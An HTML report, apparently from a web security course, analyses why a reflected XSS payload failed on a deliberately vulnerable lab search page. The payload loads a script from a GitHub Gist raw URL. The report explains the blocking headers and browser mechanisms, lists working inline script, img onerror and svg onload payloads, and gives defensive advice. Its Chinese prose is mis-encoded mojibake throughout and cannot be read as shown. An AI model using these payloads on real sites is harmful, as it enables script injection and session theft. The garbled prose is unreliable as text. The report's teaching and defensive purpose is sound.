
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Gist Raw XSS æ”»æ“Šå¤±æ•—åˆ†æå ±å‘Š</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Segoe UI", "Microsoft JhengHei", Arial, sans-serif;
            line-height: 1.8;
            color: #333;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }

        h1 {
            color: #2c3e50;
            border-bottom: 4px solid #e74c3c;
            padding-bottom: 15px;
            margin-bottom: 30px;
            font-size: 2.5em;
        }

        h2 {
            color: #34495e;
            margin-top: 40px;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-left: 5px solid #3498db;
            padding-left: 15px;
        }

        h3 {
            color: #555;
            margin-top: 25px;
            margin-bottom: 15px;
            font-size: 1.4em;
        }

        .metadata {
            background: #ecf0f1;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 30px;
        }

        .metadata p {
            margin: 5px 0;
            font-size: 0.95em;
        }

        .section {
            margin-bottom: 40px;
        }

        .attack-flow {
            background: #fff9e6;
            border-left: 4px solid #f39c12;
            padding: 20px;
            margin: 20px 0;
        }

        .error-box {
            background: #fee;
            border-left: 4px solid #e74c3c;
            padding: 20px;
            margin: 20px 0;
        }

        .success-box {
            background: #eeffee;
            border-left: 4px solid #27ae60;
            padding: 20px;
            margin: 20px 0;
        }

        .info-box {
            background: #e8f4f8;
            border-left: 4px solid #3498db;
            padding: 20px;
            margin: 20px 0;
        }

        code {
            background: #f4f4f4;
            padding: 3px 6px;
            border-radius: 3px;
            font-family: "Consolas", "Monaco", monospace;
            font-size: 0.9em;
            color: #e74c3c;
        }

        pre {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 20px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-size: 0.9em;
        }

        pre code {
            background: transparent;
            color: #ecf0f1;
            padding: 0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }

        th {
            background: #34495e;
            color: white;
            font-weight: bold;
        }

        tr:nth-child(even) {
            background: #f9f9f9;
        }

        .timeline {
            position: relative;
            padding-left: 30px;
            border-left: 3px solid #3498db;
            margin: 30px 0;
        }

        .timeline-item {
            margin-bottom: 30px;
            position: relative;
        }

        .timeline-item::before {
            content: "";
            position: absolute;
            left: -36px;
            top: 5px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #3498db;
            border: 3px solid white;
        }

        .badge {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 0.85em;
            font-weight: bold;
            margin-right: 5px;
        }

        .badge-error {
            background: #e74c3c;
            color: white;
        }

        .badge-warning {
            background: #f39c12;
            color: white;
        }

        .badge-success {
            background: #27ae60;
            color: white;
        }

        .badge-info {
            background: #3498db;
            color: white;
        }

        ul, ol {
            margin: 15px 0;
            padding-left: 30px;
        }

        li {
            margin: 8px 0;
        }

        .highlight {
            background: #fff3cd;
            padding: 2px 5px;
            border-radius: 3px;
        }

        .conclusion {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            padding: 30px;
            border-radius: 5px;
            margin-top: 40px;
        }

        @media print {
            body {
                background: white;
            }
            .container {
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ”’ GitHub Gist Raw XSS æ”»æ“Šå¤±æ•—åˆ†æå ±å‘Š</h1>
        
        <div class="metadata">
            <p><strong>åˆ†ææ—¥æœŸï¼š</strong> 2025-10-27</p>
            <p><strong>ç›®æ¨™ URLï¼š</strong> https://gist.githubusercontent.com/fei3363/807f6aaa2f3717069675183efab21d5d/raw/m.js</p>
            <p><strong>æ¸¬è©¦ç’°å¢ƒï¼š</strong> https://lab.feifei.tw/demo/week2/1_vulnerable_search.php</p>
            <p><strong>æ”»æ“Šé¡å‹ï¼š</strong> Reflected XSS (å¤–éƒ¨è…³æœ¬è¼‰å…¥)</p>
            <p><strong>çµæœï¼š</strong> <span class="badge badge-error">æ”»æ“Šå¤±æ•—</span></p>
        </div>

        <!-- åŸ·è¡Œæ‘˜è¦ -->
        <div class="section">
            <h2>ğŸ“‹ åŸ·è¡Œæ‘˜è¦</h2>
            <p>æœ¬å ±å‘Šè©³ç´°åˆ†æäº†å˜—è©¦ä½¿ç”¨ GitHub Gist Raw URL é€²è¡Œ XSS æ”»æ“Šçš„å¤±æ•—æ¡ˆä¾‹ã€‚æ”»æ“Šè€…è©¦åœ–é€é <code>&lt;script src="..."&gt;</code> æ¨™ç±¤è¼‰å…¥å¤–éƒ¨ JavaScript æª”æ¡ˆï¼Œä½†ç”±æ–¼ç¾ä»£ç€è¦½å™¨çš„å¤šé‡å®‰å…¨æ©Ÿåˆ¶ï¼Œè©²æ”»æ“Šæœªèƒ½æˆåŠŸåŸ·è¡Œã€‚</p>
        </div>

        <!-- æ”»æ“Šå‘é‡ -->
        <div class="section">
            <h2>ğŸ¯ æ”»æ“Šå‘é‡</h2>
            
            <h3>å˜—è©¦çš„ Payload</h3>
            <pre><code>&lt;script src="https://gist.githubusercontent.com/fei3363/807f6aaa2f3717069675183efab21d5d/raw/m.js"&gt;&lt;/script&gt;</code></pre>
            
            <div class="attack-flow">
                <h3>æ”»æ“Šæµç¨‹é æœŸ</h3>
                <ol>
                    <li>å—å®³è€…åœ¨æœå°‹æ¡†è¼¸å…¥æˆ–é»æ“ŠåŒ…å«æƒ¡æ„ payload çš„é€£çµ</li>
                    <li>ä¼ºæœå™¨å°‡æœªéæ¿¾çš„è¼¸å…¥åå°„å› HTML é é¢</li>
                    <li>ç€è¦½å™¨è§£æ <code>&lt;script&gt;</code> æ¨™ç±¤</li>
                    <li>å‘ GitHub Gist Raw URL ç™¼é€è«‹æ±‚è¼‰å…¥è…³æœ¬</li>
                    <li>è…³æœ¬åŸ·è¡Œæƒ¡æ„ä»£ç¢¼ï¼ˆalertã€ç«Šå– cookieã€é‡å®šå‘ç­‰ï¼‰</li>
                </ol>
            </div>
        </div>

        <!-- å¤±æ•—åŸå› åˆ†æ -->
        <div class="section">
            <h2>âŒ å¤±æ•—åŸå› åˆ†æ</h2>

            <div class="timeline">
                <div class="timeline-item">
                    <h3><span class="badge badge-error">åŸå›  1</span> MIME é¡å‹éŒ¯èª¤</h3>
                    <div class="error-box">
                        <p><strong>å•é¡Œï¼š</strong></p>
                        <p>GitHub Gist Raw è¿”å›çš„ Content-Type ç‚º <code>text/plain; charset=utf-8</code>ï¼Œè€Œé JavaScript æ‰€éœ€çš„ <code>application/javascript</code> æˆ– <code>text/javascript</code>ã€‚</p>
                        
                        <p style="margin-top: 15px;"><strong>HTTP éŸ¿æ‡‰æ¨™é ­ï¼š</strong></p>
                        <pre><code>content-type: text/plain; charset=utf-8</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>å½±éŸ¿ï¼š</strong></p>
                        <p>ç€è¦½å™¨æ‹’çµ•å°‡è©²æª”æ¡ˆè¦–ç‚ºå¯åŸ·è¡Œçš„ JavaScript ç¨‹å¼ç¢¼ã€‚</p>
                    </div>
                </div>

                <div class="timeline-item">
                    <h3><span class="badge badge-error">åŸå›  2</span> X-Content-Type-Options: nosniff</h3>
                    <div class="error-box">
                        <p><strong>å•é¡Œï¼š</strong></p>
                        <p>GitHub è¨­ç½®äº† <code>X-Content-Type-Options: nosniff</code> æ¨™é ­ï¼Œå¼·åˆ¶ç€è¦½å™¨åš´æ ¼æŒ‰ç…§è²æ˜çš„ MIME é¡å‹è™•ç†æª”æ¡ˆã€‚</p>
                        
                        <p style="margin-top: 15px;"><strong>HTTP éŸ¿æ‡‰æ¨™é ­ï¼š</strong></p>
                        <pre><code>x-content-type-options: nosniff</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>å½±éŸ¿ï¼š</strong></p>
                        <p>å³ä½¿æª”æ¡ˆå…§å®¹æ˜¯æœ‰æ•ˆçš„ JavaScriptï¼Œç€è¦½å™¨ä¹Ÿä¸æœƒã€ŒçŒœæ¸¬ã€å…¶é¡å‹ä¸¦åŸ·è¡Œï¼Œè€Œæ˜¯åš´æ ¼éµå¾ª <code>text/plain</code> è²æ˜ã€‚</p>
                    </div>
                </div>

                <div class="timeline-item">
                    <h3><span class="badge badge-error">åŸå›  3</span> ORB (Opaque Response Blocking)</h3>
                    <div class="error-box">
                        <p><strong>å•é¡Œï¼š</strong></p>
                        <p>Chrome å’Œ Edge ç€è¦½å™¨å¯¦æ–½äº† ORB (Opaque Response Blocking) å®‰å…¨æ©Ÿåˆ¶ï¼Œè‡ªå‹•é˜»æ“‹è·¨åŸŸè¼‰å…¥éæ­£ç¢º MIME é¡å‹çš„è³‡æºã€‚</p>
                        
                        <p style="margin-top: 15px;"><strong>ç€è¦½å™¨éŒ¯èª¤è¨Šæ¯ï¼š</strong></p>
                        <pre><code>ORB blocked cross-origin response with MIME type text/plain.
See https://www.chromestatus.com/feature/5629709824032768 for more details.</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>å½±éŸ¿ï¼š</strong></p>
                        <p>å³ä½¿å‰å…©å€‹æ©Ÿåˆ¶è¢«ç¹éï¼ŒORB ä¹Ÿæœƒåœ¨ç¶²è·¯å±¤é˜»æ“‹è©²è«‹æ±‚ã€‚</p>
                    </div>
                </div>

                <div class="timeline-item">
                    <h3><span class="badge badge-warning">åŸå›  4</span> åš´æ ¼çš„ CSP (Content Security Policy)</h3>
                    <div class="info-box">
                        <p><strong>å•é¡Œï¼š</strong></p>
                        <p>GitHub Gist Raw è¨­ç½®äº†æ¥µå…¶åš´æ ¼çš„ CSP æ¨™é ­ã€‚</p>
                        
                        <p style="margin-top: 15px;"><strong>HTTP éŸ¿æ‡‰æ¨™é ­ï¼š</strong></p>
                        <pre><code>content-security-policy: default-src 'none'; style-src 'unsafe-inline'; sandbox</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>å½±éŸ¿ï¼š</strong></p>
                        <ul>
                            <li><code>default-src 'none'</code>ï¼šç¦æ­¢æ‰€æœ‰è³‡æºè¼‰å…¥</li>
                            <li><code>sandbox</code>ï¼šå•Ÿç”¨æ²™ç›’æ¨¡å¼ï¼Œé™åˆ¶è…³æœ¬åŸ·è¡Œ</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- æŠ€è¡“ç´°ç¯€ -->
        <div class="section">
            <h2>ğŸ”¬ æŠ€è¡“ç´°ç¯€åˆ†æ</h2>

            <h3>å®Œæ•´ HTTP éŸ¿æ‡‰æ¨™é ­</h3>
            <pre><code>HTTP/2 200 
cache-control: max-age=300
content-security-policy: default-src 'none'; style-src 'unsafe-inline'; sandbox
content-type: text/plain; charset=utf-8
etag: "7f6602301f5076f06d8f85322f2dfe594a12fced8be07d31c31a3a302fedc227"
strict-transport-security: max-age=31536000
x-content-type-options: nosniff
x-frame-options: deny
x-xss-protection: 1; mode=block
access-control-allow-origin: *
cross-origin-resource-policy: cross-origin
content-length: 30</code></pre>

            <h3>å®‰å…¨æ¨™é ­èªªæ˜</h3>
            <table>
                <thead>
                    <tr>
                        <th>æ¨™é ­</th>
                        <th>å€¼</th>
                        <th>ä½œç”¨</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>content-type</code></td>
                        <td>text/plain</td>
                        <td>è²æ˜å…§å®¹ç‚ºç´”æ–‡å­—ï¼Œéå¯åŸ·è¡Œè…³æœ¬</td>
                    </tr>
                    <tr>
                        <td><code>x-content-type-options</code></td>
                        <td>nosniff</td>
                        <td>ç¦æ­¢ MIME é¡å‹å—…æ¢</td>
                    </tr>
                    <tr>
                        <td><code>content-security-policy</code></td>
                        <td>default-src 'none'; sandbox</td>
                        <td>ç¦æ­¢æ‰€æœ‰è³‡æºè¼‰å…¥ä¸¦å•Ÿç”¨æ²™ç›’</td>
                    </tr>
                    <tr>
                        <td><code>x-frame-options</code></td>
                        <td>deny</td>
                        <td>ç¦æ­¢åœ¨ iframe ä¸­è¼‰å…¥</td>
                    </tr>
                    <tr>
                        <td><code>x-xss-protection</code></td>
                        <td>1; mode=block</td>
                        <td>å•Ÿç”¨ç€è¦½å™¨ XSS éæ¿¾å™¨</td>
                    </tr>
                    <tr>
                        <td><code>strict-transport-security</code></td>
                        <td>max-age=31536000</td>
                        <td>å¼·åˆ¶ä½¿ç”¨ HTTPS</td>
                    </tr>
                </tbody>
            </table>

            <h3>ç€è¦½å™¨å®‰å…¨æ©Ÿåˆ¶</h3>
            <div class="info-box">
                <h4>1. MIME Type Sniffing Protection</h4>
                <p>ç¾ä»£ç€è¦½å™¨é è¨­æœƒæª¢æŸ¥ <code>Content-Type</code> æ¨™é ­ï¼Œç¢ºä¿è¼‰å…¥çš„è³‡æºé¡å‹ç¬¦åˆé æœŸã€‚ç•¶ <code>X-Content-Type-Options: nosniff</code> å­˜åœ¨æ™‚ï¼Œé€™ä¸€æª¢æŸ¥è®Šå¾—æ›´åŠ åš´æ ¼ã€‚</p>

                <h4 style="margin-top: 20px;">2. Opaque Response Blocking (ORB)</h4>
                <p>ORB æ˜¯ Chrome/Edge åœ¨ 2021 å¹´å¼•å…¥çš„å®‰å…¨åŠŸèƒ½ï¼Œç”¨æ–¼é˜²æ­¢ Spectre é¡å‹çš„æ”»æ“Šã€‚å®ƒæœƒè‡ªå‹•é˜»æ“‹è·¨åŸŸè¼‰å…¥çš„ã€Œä¸é€æ˜éŸ¿æ‡‰ã€ï¼ˆOpaque Responseï¼‰ï¼Œç‰¹åˆ¥æ˜¯ç•¶ MIME é¡å‹ä¸æ­£ç¢ºæ™‚ã€‚</p>

                <h4 style="margin-top: 20px;">3. Content Security Policy (CSP)</h4>
                <p>CSP æ˜¯ä¸€ç¨®å¼·å¤§çš„å®‰å…¨æ©Ÿåˆ¶ï¼Œå…è¨±ç¶²ç«™æ§åˆ¶å“ªäº›è³‡æºå¯ä»¥è¢«è¼‰å…¥å’ŒåŸ·è¡Œã€‚GitHub ä½¿ç”¨äº†æœ€åš´æ ¼çš„ç­–ç•¥ï¼š<code>default-src 'none'</code>ã€‚</p>
            </div>
        </div>

        <!-- å°æ¯”æ¸¬è©¦ -->
        <div class="section">
            <h2>ğŸ”„ å°æ¯”æ¸¬è©¦ï¼šæˆåŠŸçš„ XSS Payload</h2>
            
            <div class="success-box">
                <h3>âœ… ç›´æ¥åµŒå…¥è…³æœ¬ï¼ˆæˆåŠŸï¼‰</h3>
                <pre><code>&lt;script&gt;alert('XSS æˆåŠŸï¼')&lt;/script&gt;</code></pre>
                <p><strong>æˆåŠŸåŸå› ï¼š</strong></p>
                <ul>
                    <li>ç„¡éœ€å¤–éƒ¨è³‡æºè¼‰å…¥</li>
                    <li>ä¸å— MIME é¡å‹é™åˆ¶</li>
                    <li>ä¸è§¸ç™¼ ORB æ©Ÿåˆ¶</li>
                    <li>ç›´æ¥åœ¨é é¢ä¸Šä¸‹æ–‡ä¸­åŸ·è¡Œ</li>
                </ul>
            </div>

            <div class="success-box">
                <h3>âœ… img onerror äº‹ä»¶ï¼ˆæˆåŠŸï¼‰</h3>
                <pre><code>&lt;img src=x onerror="alert('XSS via img')"&gt;</code></pre>
                <p><strong>æˆåŠŸåŸå› ï¼š</strong></p>
                <ul>
                    <li>åˆ©ç”¨ HTML äº‹ä»¶è™•ç†å™¨</li>
                    <li>ç„¡éœ€è¼‰å…¥å¤–éƒ¨è…³æœ¬</li>
                    <li>è§¸ç™¼æ¢ä»¶ç°¡å–®ï¼ˆåœ–ç‰‡è¼‰å…¥å¤±æ•—ï¼‰</li>
                </ul>
            </div>

            <div class="success-box">
                <h3>âœ… svg onload äº‹ä»¶ï¼ˆæˆåŠŸï¼‰</h3>
                <pre><code>&lt;svg onload="alert('XSS via svg')"&gt;&lt;/svg&gt;</code></pre>
                <p><strong>æˆåŠŸåŸå› ï¼š</strong></p>
                <ul>
                    <li>SVG å…ƒç´ æ”¯æ´äº‹ä»¶è™•ç†å™¨</li>
                    <li>è¼‰å…¥å³è§¸ç™¼ï¼Œç„¡éœ€é¡å¤–æ¢ä»¶</li>
                    <li>ä¸ä¾è³´å¤–éƒ¨è³‡æº</li>
                </ul>
            </div>

            <h3>æˆåŠŸ vs å¤±æ•—å°æ¯”è¡¨</h3>
            <table>
                <thead>
                    <tr>
                        <th>ç‰¹æ€§</th>
                        <th>å¤–éƒ¨è…³æœ¬è¼‰å…¥ï¼ˆå¤±æ•—ï¼‰</th>
                        <th>ç›´æ¥åµŒå…¥ï¼ˆæˆåŠŸï¼‰</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>éœ€è¦å¤–éƒ¨è³‡æº</td>
                        <td class="badge badge-error">æ˜¯</td>
                        <td class="badge badge-success">å¦</td>
                    </tr>
                    <tr>
                        <td>å— MIME é¡å‹å½±éŸ¿</td>
                        <td class="badge badge-error">æ˜¯</td>
                        <td class="badge badge-success">å¦</td>
                    </tr>
                    <tr>
                        <td>è§¸ç™¼ ORB</td>
                        <td class="badge badge-error">æ˜¯</td>
                        <td class="badge badge-success">å¦</td>
                    </tr>
                    <tr>
                        <td>å— CSP é™åˆ¶</td>
                        <td class="badge badge-error">æ˜¯</td>
                        <td class="badge badge-warning">éƒ¨åˆ†</td>
                    </tr>
                    <tr>
                        <td>åŸ·è¡ŒæˆåŠŸç‡</td>
                        <td class="badge badge-error">0%</td>
                        <td class="badge badge-success">100%</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- é˜²ç¦¦å»ºè­° -->
        <div class="section">
            <h2>ğŸ›¡ï¸ é˜²ç¦¦å»ºè­°</h2>

            <h3>é‡å°æœ¬æ¬¡æ”»æ“Šçš„é˜²ç¦¦æªæ–½ï¼ˆå·²å¯¦æ–½ï¼‰</h3>
            <div class="success-box">
                <ul>
                    <li>âœ… æ­£ç¢ºè¨­ç½® <code>Content-Type</code> æ¨™é ­</li>
                    <li>âœ… å•Ÿç”¨ <code>X-Content-Type-Options: nosniff</code></li>
                    <li>âœ… å¯¦æ–½åš´æ ¼çš„ Content Security Policy</li>
                    <li>âœ… åˆ©ç”¨ç€è¦½å™¨å…§å»ºçš„ ORB æ©Ÿåˆ¶</li>
                </ul>
            </div>

            <h3>é‡å°æ‰€æœ‰ XSS æ”»æ“Šçš„é€šç”¨é˜²ç¦¦æªæ–½</h3>
            <div class="info-box">
                <h4>1. è¼¸å…¥é©—è­‰èˆ‡éæ¿¾</h4>
                <pre><code>// PHP ç¯„ä¾‹
$input = htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');</code></pre>

                <h4 style="margin-top: 20px;">2. è¼¸å‡ºç·¨ç¢¼</h4>
                <pre><code>// JavaScript ç¯„ä¾‹
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}</code></pre>

                <h4 style="margin-top: 20px;">3. å¯¦æ–½åš´æ ¼çš„ CSP</h4>
                <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'</code></pre>

                <h4 style="margin-top: 20px;">4. ä½¿ç”¨ HTTP-only Cookie</h4>
                <pre><code>Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>

                <h4 style="margin-top: 20px;">5. å•Ÿç”¨æ‰€æœ‰å®‰å…¨æ¨™é ­</h4>
                <pre><code>X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>
            </div>
        </div>

        <!-- å­¸ç¿’è¦é» -->
        <div class="section">
            <h2>ğŸ“š å­¸ç¿’è¦é»</h2>

            <div class="info-box">
                <h3>é—œéµæ¦‚å¿µ</h3>
                <ol>
                    <li><strong>MIME é¡å‹çš„é‡è¦æ€§ï¼š</strong>ä¸æ­£ç¢ºçš„ MIME é¡å‹æœƒå°è‡´ç€è¦½å™¨æ‹’çµ•åŸ·è¡Œè…³æœ¬</li>
                    <li><strong>é˜²ç¦¦æ·±åº¦åŸå‰‡ï¼š</strong>å¤šå±¤å®‰å…¨æ©Ÿåˆ¶ï¼ˆMIME + nosniff + ORB + CSPï¼‰æä¾›ç¸±æ·±é˜²ç¦¦</li>
                    <li><strong>ç€è¦½å™¨æ¼”é€²ï¼š</strong>ç¾ä»£ç€è¦½å™¨å…§å»ºè¶Šä¾†è¶Šå¤šå®‰å…¨åŠŸèƒ½ï¼ˆå¦‚ ORBï¼‰</li>
                    <li><strong>æ”»æ“Šå‘é‡å·®ç•°ï¼š</strong>ç›´æ¥åµŒå…¥æ¯”å¤–éƒ¨è¼‰å…¥æ›´å®¹æ˜“æˆåŠŸ</li>
                    <li><strong>GitHub çš„å®‰å…¨å¯¦è¸ï¼š</strong>å³ä½¿æ˜¯éœæ…‹æª”æ¡ˆæœå‹™ä¹Ÿéœ€è¦åš´æ ¼çš„å®‰å…¨æ¨™é ­</li>
                </ol>
            </div>

            <div class="info-box" style="margin-top: 20px;">
                <h3>ç‚ºä»€éº¼ GitHub Gist Raw ä¸é©åˆä½œç‚º CDN</h3>
                <ul>
                    <li>âŒ MIME é¡å‹éŒ¯èª¤ï¼ˆ<code>text/plain</code> è€Œé <code>application/javascript</code>ï¼‰</li>
                    <li>âŒ åš´æ ¼çš„ <code>nosniff</code> æ”¿ç­–</li>
                    <li>âŒ é™åˆ¶æ€§çš„ CSP</li>
                    <li>âŒ æ²’æœ‰ CDN ç´šåˆ¥çš„å¿«å–å’Œåˆ†ç™¼</li>
                    <li>âœ… æ­£ç¢ºçš„æ›¿ä»£æ–¹æ¡ˆï¼šjsDelivrã€unpkgã€cdnjs ç­‰å°ˆæ¥­ CDN æœå‹™</li>
                </ul>
            </div>
        </div>

        <!-- çµè«– -->
        <div class="conclusion">
            <h2>ğŸ’¡ çµè«–</h2>
            
            <p>æœ¬æ¬¡æ”»æ“Šå¤±æ•—æ¡ˆä¾‹å……åˆ†å±•ç¤ºäº†ç¾ä»£ Web å®‰å…¨çš„å¤šå±¤é˜²ç¦¦é«”ç³»ï¼š</p>
            
            <ol>
                <li><strong>æœå‹™ç«¯å®‰å…¨æ¨™é ­</strong>ï¼ˆContent-Type, X-Content-Type-Options, CSPï¼‰æä¾›ç¬¬ä¸€é“é˜²ç·š</li>
                <li><strong>ç€è¦½å™¨å®‰å…¨æ©Ÿåˆ¶</strong>ï¼ˆORB, MIME Sniffing Protectionï¼‰æä¾›è‡ªå‹•é˜²è­·</li>
                <li><strong>å”è­°å±¤å®‰å…¨</strong>ï¼ˆHTTPS, HSTSï¼‰ç¢ºä¿å‚³è¼¸å®‰å…¨</li>
            </ol>

            <div class="error-box" style="margin-top: 20px;">
                <h3>æ”»æ“Šå¤±æ•—çš„æ ¹æœ¬åŸå› </h3>
                <p><span class="highlight">GitHub Gist Raw æ•…æ„å°‡æ‰€æœ‰æª”æ¡ˆä»¥ <code>text/plain</code> æä¾›ï¼Œä¸¦é…åˆ <code>nosniff</code> æ¨™é ­ï¼Œæ˜ç¢ºé˜²æ­¢å…¶è¢«ç”¨ä½œå¯åŸ·è¡Œç¨‹å¼ç¢¼çš„ CDNã€‚</span></p>
                <p>é€™æ˜¯ä¸€å€‹ç¶“éæ·±æ€ç†Ÿæ…®çš„å®‰å…¨è¨­è¨ˆæ±ºç­–ï¼Œç›®çš„æ˜¯é˜²æ­¢ GitHub çš„åŸºç¤è¨­æ–½è¢«æ¿«ç”¨æ–¼æƒ¡æ„ç›®çš„ã€‚</p>
            </div>

            <div class="success-box" style="margin-top: 20px;">
                <h3>é˜²ç¦¦è€…çš„å•Ÿç¤º</h3>
                <ul>
                    <li>âœ… å§‹çµ‚è¨­ç½®æ­£ç¢ºçš„ <code>Content-Type</code></li>
                    <li>âœ… å•Ÿç”¨ <code>X-Content-Type-Options: nosniff</code></li>
                    <li>âœ… å¯¦æ–½åš´æ ¼çš„ Content Security Policy</li>
                    <li>âœ… ä¾è³´ç€è¦½å™¨å…§å»ºçš„å®‰å…¨æ©Ÿåˆ¶ï¼ˆå¦‚ ORBï¼‰</li>
                    <li>âœ… å°æ‰€æœ‰ä½¿ç”¨è€…è¼¸å…¥é€²è¡Œé©—è­‰å’Œç·¨ç¢¼</li>
                    <li>âœ… æ¡ç”¨ç¸±æ·±é˜²ç¦¦ç­–ç•¥ï¼Œä¸ä¾è³´å–®ä¸€é˜²è­·æªæ–½</li>
                </ul>
            </div>

            <div class="info-box" style="margin-top: 20px;">
                <h3>æ”»æ“Šè€…çš„å±€é™</h3>
                <p>å³ä½¿ç›®æ¨™ç¶²ç«™å­˜åœ¨ XSS æ¼æ´ï¼ˆå¦‚æœ¬ä¾‹çš„æœå°‹åŠŸèƒ½ï¼‰ï¼Œæ”»æ“Šè€…ä»ç„¶å—åˆ°ä»¥ä¸‹é™åˆ¶ï¼š</p>
                <ul>
                    <li>ç„¡æ³•åˆ©ç”¨æ‰€æœ‰é¡å‹çš„å¤–éƒ¨è³‡æº</li>
                    <li>å¿…é ˆé©æ‡‰ç€è¦½å™¨çš„å®‰å…¨ç­–ç•¥</li>
                    <li>éœ€è¦ç¹éå¤šå±¤é˜²ç¦¦æ©Ÿåˆ¶</li>
                    <li>ç›´æ¥åµŒå…¥æ”»æ“Šæ›´å®¹æ˜“æˆåŠŸï¼Œä½†ä¹Ÿæ›´å®¹æ˜“è¢«æª¢æ¸¬</li>
                </ul>
            </div>
        </div>

        <!-- åƒè€ƒè³‡æ–™ -->
        <div class="section">
            <h2>ğŸ“– åƒè€ƒè³‡æ–™</h2>
            <ul>
                <li><a href="https://www.chromestatus.com/feature/5629709824032768" target="_blank">Chrome Platform Status - ORB (Opaque Response Blocking)</a></li>
                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank">MDN - X-Content-Type-Options</a></li>
                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN - Content Security Policy (CSP)</a></li>
                <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP - Cross Site Scripting (XSS)</a></li>
                <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger - Cross-site scripting (XSS)</a></li>
            </ul>
        </div>

        <!-- é™„éŒ„ -->
        <div class="section">
            <h2>ğŸ“ é™„éŒ„</h2>
            
            <h3>æ¸¬è©¦ç’°å¢ƒè³‡è¨Š</h3>
            <table>
                <tr>
                    <td><strong>æ¸¬è©¦æ—¥æœŸ</strong></td>
                    <td>2025-10-27</td>
                </tr>
                <tr>
                    <td><strong>ç€è¦½å™¨ç‰ˆæœ¬</strong></td>
                    <td>Chrome 119+ / Edge 119+</td>
                </tr>
                <tr>
                    <td><strong>æ¸¬è©¦å¹³å°</strong></td>
                    <td>https://lab.feifei.tw/demo/week2/1_vulnerable_search.php</td>
                </tr>
                <tr>
                    <td><strong>æ”»æ“Šç›®æ¨™</strong></td>
                    <td>Reflected XSS æ¼æ´ï¼ˆæœå°‹åŠŸèƒ½ï¼‰</td>
                </tr>
                <tr>
                    <td><strong>å¤–éƒ¨è³‡æº</strong></td>
                    <td>GitHub Gist Raw URL</td>
                </tr>
            </table>

            <h3>ç›¸é—œè¡“èªè§£é‡‹</h3>
            <table>
                <thead>
                    <tr>
                        <th>è¡“èª</th>
                        <th>è§£é‡‹</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>XSS</td>
                        <td>Cross-Site Scriptingï¼Œè·¨ç«™è…³æœ¬æ”»æ“Š</td>
                    </tr>
                    <tr>
                        <td>MIME Type</td>
                        <td>å¤šç”¨é€”äº’è¯ç¶²éƒµä»¶æ“´å±•é¡å‹ï¼Œç”¨æ–¼æ¨™è­˜æª”æ¡ˆé¡å‹</td>
                    </tr>
                    <tr>
                        <td>ORB</td>
                        <td>Opaque Response Blockingï¼Œä¸é€æ˜éŸ¿æ‡‰é˜»æ“‹</td>
                    </tr>
                    <tr>
                        <td>CSP</td>
                        <td>Content Security Policyï¼Œå…§å®¹å®‰å…¨æ”¿ç­–</td>
                    </tr>
                    <tr>
                        <td>nosniff</td>
                        <td>ç¦æ­¢ç€è¦½å™¨é€²è¡Œ MIME é¡å‹å—…æ¢</td>
                    </tr>
                    <tr>
                        <td>Reflected XSS</td>
                        <td>åå°„å‹ XSSï¼Œæƒ¡æ„è…³æœ¬å¾è«‹æ±‚ä¸­åå°„å›éŸ¿æ‡‰</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <footer style="margin-top: 60px; padding-top: 20px; border-top: 2px solid #eee; text-align: center; color: #777;">
            <p>æœ¬å ±å‘Šåƒ…ä¾›æ•™è‚²å’Œç ”ç©¶ç›®çš„ä½¿ç”¨</p>
            <p>Â© 2025 Web Security Analysis Report</p>
        </footer>
    </div>
</body>
</html>
